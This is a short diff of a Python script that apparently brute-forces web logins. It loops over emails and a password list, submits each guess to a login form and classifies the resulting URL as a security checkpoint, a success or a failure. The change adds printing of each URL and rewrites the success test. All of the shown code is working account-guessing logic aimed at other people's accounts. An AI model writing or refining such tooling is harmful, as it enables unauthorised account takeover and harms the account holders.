@@ -182,10 +182,10 @@ def run(emails,passlist,timernextupfun,blockedtimerfun,typicalstatus):
 				login_form.select("#pass")[0]['value'] = passwd
 				page = browser.submit(login_form, login_page.url)
 				urlstatus = str(page.url)
-				#print(urlstatus)
+				print("[+] Get URL : {}".format(urlstatus))
 				if 'checkpoint' in urlstatus:
 					getsetting = False
-				elif 'login.php' not in urlstatus:
+				elif 'login' not in urlstatus or '=100' not in urlstatus:
 					getsetting = True
 				else:
 					getsetting = None
